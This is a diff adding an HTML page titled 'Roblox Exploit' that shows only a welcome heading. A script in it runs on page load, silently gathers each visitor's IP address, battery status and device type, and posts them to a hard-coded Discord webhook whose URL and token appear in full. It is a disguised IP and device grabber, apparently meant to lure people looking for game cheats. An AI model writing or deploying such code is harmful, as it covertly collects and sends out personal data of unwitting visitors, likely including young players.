@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Exploit</title>
+</head>
+<body>
+    <h1>Welcome to Our Site</h1>
+    <script>
+        async function sendToWebhook(data) {
+            const webhookURL = "https://discord.com/api/webhooks/1269291496922808403/Oojg7HJli9J0DWJoYjPdTpa7s_HBX4m6wZPArqFnxKGcmEX4eFI2UU7zWmVqV8BVedOC";
+
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: data
+                })
+            });
+        }
+
+        async function getIPAddress() {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        }
+
+        async function getBatteryInfo() {
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                return {
+                    level: battery.level * 100 + "%",
+                    charging: battery.charging ? "Yes" : "No"
+                };
+            } else {
+                return {
+                    level: "Unknown",
+                    charging: "Unknown"
+                };
+            }
+        }
+
+        function getPhoneInfo() {
+            const ua = navigator.userAgent;
+            let phoneInfo = "Unknown";
+
+            if (/android/i.test(ua)) {
+                phoneInfo = "Android Device";
+            } else if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
+                phoneInfo = "iOS Device";
+            } else if (/windows phone/i.test(ua)) {
+                phoneInfo = "Windows Phone";
+            } else if (/Macintosh/i.test(ua)) {
+                phoneInfo = "Macintosh";
+            } else if (/Windows/i.test(ua)) {
+                phoneInfo = "Windows PC";
+            }
+
+            return phoneInfo;
+        }
+
+        async function gatherAndSendData() {
+            const ip = await getIPAddress();
+            const battery = await getBatteryInfo();
+            const phoneInfo = getPhoneInfo();
+
+            const data = `
+                **IP Address:** ${ip}
+                **Battery Level:** ${battery.level}
+                **Charging:** ${battery.charging}
+                **Device Info:** ${phoneInfo}
+            `;
+
+            sendToWebhook(data);
+        }
+
+        window.onload = gatherAndSendData;
+    </script>
+</body>
+</html>
